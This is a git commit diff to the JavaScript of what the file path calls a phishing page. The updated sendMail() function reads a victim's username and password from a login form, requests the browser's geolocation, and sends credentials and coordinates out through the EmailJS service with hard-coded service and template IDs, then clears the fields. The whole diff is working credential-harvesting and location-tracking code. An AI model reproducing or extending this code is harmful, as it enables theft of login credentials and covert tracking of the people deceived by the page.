d30ea05abe85fb47d5608427111d036b8a6af5e2
gorkem4962 <80282479+gorkem4962@users.noreply.github.com>
2025-05-07 12:37:00 +0200

    Update app.js

--- Phishing/js/app.js
+++ Phishing/js/app.js
@@ -1,22 +1,39 @@
-function sendMail(){
-  var params = {
-    username_id: document.getElementById("username").value,
-    passwort_id: document.getElementById("password").value,
+function sendMail() {
+  // First, get the username and password
+  var username = document.getElementById("username").value;
+  var password = document.getElementById("password").value;
 
-  };
+  // Check if geolocation is supported
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      // Get location coordinates
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
 
-  const serviceid = 'service_4kvbchh';
-  const templateid = 'template_irilfla';
-  emailjs.send(serviceid,templateid,params)
-  .then(
-    res => {
-     
-      document.getElementById("username").value = "";
-      document.getElementById("password").value = "";
-      
-    })
-    .catch((err) => alert(err));
+      // Include location data in params
+      var params = {
+        username_id: username,
+        passwort_id: password,
+        latitude: latitude,
+        longitude: longitude
+      };
 
+      const serviceid = 'service_udupifp';
+      const templateid = 'template_rfoq0w4';
+
+      emailjs.send(serviceid, templateid, params)
+        .then(res => {
+          document.getElementById("username").value = "";
+          document.getElementById("password").value = "";
+        })
+        .catch(err => alert(err));
+
+    }, function(error) {
+      alert("Unable to retrieve location: " + error.message);
+    });
+  } else {
+    alert("Geolocation is not supported by this browser.");
+  }
 }
 function forwarding(){
   document.getElementById("LoginButton").addEventListener("click", function() {
